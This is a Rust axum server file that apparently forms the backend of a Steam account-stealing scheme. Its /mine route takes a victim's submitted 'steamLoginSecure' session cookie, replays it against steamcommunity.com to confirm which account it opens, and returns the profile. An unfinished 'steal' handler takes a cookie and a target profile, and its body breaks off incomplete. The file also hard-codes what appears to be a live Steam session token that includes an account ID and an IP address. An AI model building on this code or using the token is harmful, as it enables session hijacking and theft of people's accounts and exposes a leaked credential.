use anyhow::Result;
use axum::extract::{Query, RawQuery};
use axum::response::{Html, IntoResponse, Redirect, Response};
use axum::{Json, Router, Server};
use axum::http::StatusCode;
use axum::routing::{get, post};
use once_cell::sync::Lazy;
use paris::{error, info, success};
use reqwest::Client;
use reqwest::redirect::Policy;
use scraper::{ElementRef, Selector};
use serde::{Deserialize, Serialize};


#[tokio::main]
async fn main() -> Result<()> {
    let app = Router::new()
        .route("/", get(root))
        .route("/mine", post(mine))
        .route("/profile", get(profile));

    info!("Attempting to bind server...");
    let builder = Server::bind(&"0.0.0.0:8000".parse()?);

    success!("Successfully bound to port 8000");
    builder.serve(app.into_make_service()).await?;

    Ok(())
}

async fn root() -> Html<&'static str> {
    Html(include_str!("../templates/index.html"))
}

#[derive(Deserialize)]
struct TestBody {
    cookie: String,
}

async fn mine(Json(TestBody { cookie }): Json<TestBody>) -> Response {
    let client = Client::builder()
        .redirect(Policy::none())
        .build()
        .unwrap();

    // let cookie = "76561198286609782%7C%7CeyAidHlwIjogIkpXVCIsICJhbGciOiAiRWREU0EiIH0.eyAiaXNzIjogInI6MTFEMF8yMjMxODEzRl9DRkNDRCIsICJzdWIiOiAiNzY1NjExOTgyODY2MDk3ODIiLCAiYXVkIjogWyAid2ViIiBdLCAiZXhwIjogMTY4NDAzNDk2NywgIm5iZiI6IDE2NzUzMDc2NTcsICJpYXQiOiAxNjgzOTQ3NjU3LCAianRpIjogIjE0M0JfMjI4NUNBOUJfRUJGNjgiLCAib2F0IjogMTY3ODMwMTkwMywgInJ0X2V4cCI6IDE2OTYzOTQwOTksICJwZXIiOiAwLCAiaXBfc3ViamVjdCI6ICI3MS4xOTEuODQuMjgiLCAiaXBfY29uZmlybWVyIjogIjcxLjE5MS44NC4yOCIgfQ.71ndyfohgopVd81ccE2I6snOSnz1uCokQYYe6e6FMT94YWeELAY5eszlgpMWIvp0QI4ANDFF6VzKIJo22-kiAg";

    let res = match client.get("https://steamcommunity.com/my/profile")
        .header("cookie", format!("steamLoginSecure={cookie}"))
        .header("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36")
        .send()
        .await {
        Ok(r) => r,
        Err(e) => {
            error!("Error getting profile -> {e:?}");
            return StatusCode::INTERNAL_SERVER_ERROR.into_response();
        }
    };

    let location = res.headers()
        .get("Location")
        .map(|l| l.to_str().ok())
        .flatten()
        .unwrap_or_default();

    if location.is_empty() || location == "https://steamcommunity.com/login/home/?goto=%2Fmy%2Fprofile" {
        return StatusCode::BAD_REQUEST.into_response();
    }

    match parse_profile(location).await {
        Ok(o) => Json(o).into_response(),
        Err(e) => {
            error!("Error parsing profile {location} -> {e:?}");
            StatusCode::INTERNAL_SERVER_ERROR.into_response()
        }
    }
}

#[derive(Deserialize)]
struct ProfileParam {
    profile_url: String,
}

async fn profile(Query(ProfileParam { mut profile_url }): Query<ProfileParam>) -> Response {
    if !profile_url.starts_with("https://steamcommunity.com/id/") {
        profile_url = format!("https://steamcommunity.com/id/{profile_url}");
    }

    match parse_profile(&profile_url).await {
        Ok(o) => Json(o).into_response(),
        Err(e) => {
            (e.to_string(), StatusCode::INTERNAL_SERVER_ERROR).into_response()
        }
    }
}

#[derive(Deserialize)]
struct StealBody {
    cookie: String,
    profile_url: String,
}

async fn steal(Json(StealBody{cookie, mut profile_url}): Json<StealBody>) -> Response {
    if !profile_url.starts_with("https://steamcommunity.com/id/") {
        profile_url = format!("https://steamcommunity.com/id/{profile_url}");
    }

    let profile = match parse_profile(&profile_url).await {
        Ok(o) => o,
        Err(e) => return StatusCode::BAD_REQUEST.into_response()
    };

    
}

#[derive(Serialize, Deserialize, Debug)]
struct Profile {
    name: String,
    icon_url: String,
}

async fn parse_profile(url: &str) -> Result<Profile> {
    let cookie = "76561198286609782%7C%7CeyAidHlwIjogIkpXVCIsICJhbGciOiAiRWREU0EiIH0.eyAiaXNzIjogInI6MTFEMF8yMjMxODEzRl9DRkNDRCIsICJzdWIiOiAiNzY1NjExOTgyODY2MDk3ODIiLCAiYXVkIjogWyAid2ViIiBdLCAiZXhwIjogMTY4NDAzNDk2NywgIm5iZiI6IDE2NzUzMDc2NTcsICJpYXQiOiAxNjgzOTQ3NjU3LCAianRpIjogIjE0M0JfMjI4NUNBOUJfRUJGNjgiLCAib2F0IjogMTY3ODMwMTkwMywgInJ0X2V4cCI6IDE2OTYzOTQwOTksICJwZXIiOiAwLCAiaXBfc3ViamVjdCI6ICI3MS4xOTEuODQuMjgiLCAiaXBfY29uZmlybWVyIjogIjcxLjE5MS44NC4yOCIgfQ.71ndyfohgopVd81ccE2I6snOSnz1uCokQYYe6e6FMT94YWeELAY5eszlgpMWIvp0QI4ANDFF6VzKIJo22-kiAg";

    let resp = Client::default().get(url)
        .header("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36")
        .send()
        .await?;

    let text = resp.text().await?;
    let document = scraper::Html::parse_document(&text);
    // .actual_persona_name
    // .playerAvatarAutoSizeInner > img
    let name = document.select(&Selector::parse(".actual_persona_name").unwrap())
        .flat_map(|e| e.text())
        // for some fucking reason there are 2 elements,
        // one w/ the name and the other is " "
        .filter(|e| !e.is_empty())
        .collect::<String>();

    let icon_url = document.select(&Selector::parse(".playerAvatarAutoSizeInner > img").unwrap())
        .filter_map(|e| e.value().attr("src"))
        .map(|e| e.to_string())
        .collect::<String>();

    Ok(
        Profile {
            name,
            icon_url,
        }
    )
}